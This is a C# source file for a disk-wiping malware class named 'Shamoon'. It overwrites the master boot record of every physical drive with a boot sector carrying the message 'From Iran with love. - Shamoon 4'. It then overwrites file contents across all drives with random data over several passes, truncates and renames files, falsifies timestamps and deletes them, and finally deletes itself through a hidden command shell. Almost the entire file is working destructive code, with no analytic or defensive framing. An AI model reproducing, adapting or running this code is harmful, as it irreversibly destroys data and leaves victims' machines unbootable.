using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

namespace Main
{

    class Shamoon
    {
        //https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        //https://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx
        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        //dwDesiredAccess
        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        //dwShareMode
        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        //dwCreationDisposition
        private const uint OpenExisting = 0x3;

        //dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;


        enum WipeType
        {
            Content,
            File
        }
        enum WipePass
        {
            Dode, // 3 pass
            Dod, // 7 pass
            Gutmann // 35 pass
        }
        public static void Start()
        {
            try
            {
                // i do not want hit myself :)
                if (Directory.Exists(@"C:\Python27"))
                {
                    Environment.Exit(0);
                }

                // Set file wipe pass to 3
                WipePass WipePass = WipePass.Dod;


                List<string> Drives;
                Drives = GetDrives();

                if (!(Drives == null) || !(Drives.Count == 0))
                {
                    // Stage 1 - Destroy MBR

                    for (int i = 0; i < Drives.Count; i++)
                    {
                        try
                        {
                            // Read resoruce
                            byte[] mbrData = new byte[] {
                            0xE9, 0x00, 0x00, 0xE8, 0x21, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x36,
                            0x7C, 0xE8, 0x00, 0x00, 0x50, 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x07,
                            0xE8, 0x07, 0x00, 0x46, 0xE9, 0xF3, 0xFF, 0xE9, 0xFD, 0xFF, 0xB4, 0x0E,
                            0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x4F, 0xB9, 0x00, 0x00,
                            0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x46, 0x72, 0x6F, 0x6D, 0x20, 0x49,
                            0x72, 0x61, 0x6E, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x6C, 0x6F, 0x76,
                            0x65, 0x2E, 0x20, 0x2D, 0x20, 0x53, 0x68, 0x61, 0x6D, 0x6F, 0x6F, 0x6E,
                            0x20, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
                            };

                            if (!(mbrData.Length == 512))
                                return;

                            var mbr = CreateFile(
                                "\\\\.\\PhysicalDrive" + i,
                                GenericAll,
                                FileShareRead | FileShareWrite,
                                IntPtr.Zero,
                                OpenExisting,
                                0,
                                IntPtr.Zero);

                            if (mbr == (IntPtr)(-0x1))
                            {
                                // Error
                                break;
                            }

                            if (WriteFile(
                                mbr,
                                mbrData,
                                MbrSize,
                                out uint lpNumberOfBytesWritten,
                                IntPtr.Zero))
                            {
                                // Success
                            }
                            else
                            {
                                // Error
                                break;
                            }
           
                        }
                        catch (Exception)
                        {

                        }
                    }

                    // Stage 2 - Destroy files content
                    for (int i = 0; i < Drives.Count; i++)
                    {
                        Search(Drives[i], WipeType.Content, WipePass);

                    }


                    // Stage 3 - Delete files
                    for (int i = 0; i < Drives.Count; i++)
                    {
                        Search(Drives[i], WipeType.File, WipePass);
                    }
                }

                // Stage 4 - Remove self

                // https://stackoverflow.com/questions/19689054/is-it-possible-for-a-c-sharp-built-exe-to-self-delete
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });

                // Final - Shut it down!
                /*
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/c shutdown /S /T 0 /F",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
                */
            }
            catch (Exception)
            {

            }
        }
        static void Search(string sPath, WipeType WipeType, WipePass WipePass)
        {
            try
            {
   
                List<string> Files;
                Files = GetFiles(sPath);

                List<string> Directores;
                Directores = GetDirectores(sPath);

                if (!(Files == null) && !(Files.Count == 0))
                {
                    foreach (string sFile in Files)
                    {
                        FileInfo FileInfo = new FileInfo(sFile);

                        if (!(FileInfo.Attributes == FileAttributes.Normal))
                        {
                            try
                            {
                                if (WipeType == WipeType.Content)
                                    File.SetAttributes(sPath, FileAttributes.Normal);

                                bool Status;
                                Status = Delete(sFile, WipeType, WipePass);
                            }
                            catch (Exception)
                            {

                            }
                        }
                    }

                }

                if (!(Directores == null) && !(Directores.Count == 0))
                {
                    foreach (string sDirectory in Directores)
                    {
                        string[] Sensitive = new string[] {
                            "windows", "system volume information"
                        };

                        DirectoryInfo DirectoryInfo = new DirectoryInfo(sDirectory);

                        try
                        {
                            if (Array.IndexOf(Sensitive, DirectoryInfo.Name.ToLower()) == -1)
                            {
                                Search(sDirectory, WipeType, WipePass);
                            }
                            else
                            {
                                continue;
                            }
                        }
                        catch (Exception)
                        {

                        }
                    }
                }
             
            }
            catch (Exception)
            {

            }
        }
        // https://www.codeproject.com/Articles/22736/%2FArticles%2F22736%2FSecurely-Delete-a-File-using-NET
        static bool Delete(string sPath, WipeType WipeType, WipePass WipePass)
        {
            try
            {
                Random Random = new Random();

                if (WipeType == WipeType.Content)
                {
                    double sectors = Math.Ceiling(new FileInfo(sPath).Length / 512.0);

                    // Create a dummy-buffer the size of a sector.

                    byte[] dummyBuffer = new byte[512];

                    // Create a cryptographic Random Number Generator.
                    // This is what I use to create the garbage data.

                    RNGCryptoServiceProvider RNGCryptoServiceProvider = new RNGCryptoServiceProvider();

                    // Get files wipe pass
                    Int32 Pass = 0;
                    switch (WipePass)
                    {
                        case WipePass.Dode:
                            Pass = 3;
                            break;
                        case WipePass.Dod:
                            Pass = 7;
                            break;
                        case WipePass.Gutmann:
                            Pass = 35;
                            break;
                        default:
                            break;
                    }

                    // Open a FileStream to the file.
                    FileStream FileStream = new FileStream(sPath, FileMode.Open);
                    for (int currentPass = 0; currentPass < Pass; currentPass++)
                    {

                        // Go to the beginning of the stream

                        FileStream.Position = 0;

                        // Loop all sectors
                        for (int sectorsWritten = 0; sectorsWritten < sectors; sectorsWritten++)
                        {

                            RNGCryptoServiceProvider.GetBytes(dummyBuffer);

                            // Write it to the stream
                            FileStream.Write(dummyBuffer, 0, dummyBuffer.Length);
                        }
                    }

                    // Close the stream.
                    FileStream.Close();

                    // All ok
                    return true;
                }
                else if (WipeType == WipeType.File)
                {
                    // Set original file size to zero and make super hard to recovery
                    FileStream FileStream = new FileStream(sPath, FileMode.Open);
                    FileStream.SetLength(0);
                    FileStream.Close();

                    // Get random filename
                    string RandomFileName;
                    RandomFileName = Path.GetRandomFileName();

                    // Get random datatime
                    DateTime Start;
                    Start = new DateTime(1995, 1, 1);
                    Int32 Range;
                    Range = (DateTime.Today - Start).Days;
                    DateTime RandomDateTime;
                    RandomDateTime = Start.AddDays(Random.Next(Range));

                    // Obfuscate file metadata
                    File.SetCreationTime(sPath, RandomDateTime);
                    File.SetLastAccessTime(sPath, RandomDateTime);
                    File.SetLastWriteTime(sPath, RandomDateTime);

                    // Rename file to random name
                    File.Move(sPath, RandomFileName);

                    // Delete file
                    File.Delete(RandomFileName);

                    // All ok
                    return true;
                }
            }
            catch (Exception)
            {

            }
            // Something are not right
            return false;
        }
        static List<string> GetDirectores(string sPath)
        {
            try
            {
                List<string> Temp = new List<string>();

                foreach (string sDirectory in Directory.GetDirectories(sPath))
                {
                    DirectoryInfo DirectoryInfo = new DirectoryInfo(sDirectory);
                    Temp.Add(sDirectory);
                }
                return Temp;
            }
            catch (Exception)
            {

            }
            return null;
        }
        static List<string> GetFiles(string sPath)
        {
            try
            {
                List<string> Temp = new List<string>();

                foreach (string sFile in Directory.GetFiles(sPath))
                {
                    FileInfo FileInfo = new FileInfo(sFile);

                    if (!(FileInfo.Attributes == FileAttributes.System))
                    {
                        Temp.Add(sFile);
                    }
                }
                return Temp;
            }
            catch (Exception)
            {

            }
            return null;
        }
        static List<string> GetDrives()
        {
            try
            {
                List<string> Temp = new List<string>();

                foreach (string sDrive in Environment.GetLogicalDrives())
                {
                    DriveInfo DriveInfo = new DriveInfo(sDrive);

                    if (DriveInfo.IsReady && !(DriveInfo.DriveType == DriveType.CDRom))
                        Temp.Add(sDrive);
                }
                return Temp;
            }
            catch (Exception)
            {

            }
            return null;
        }
    }
   
}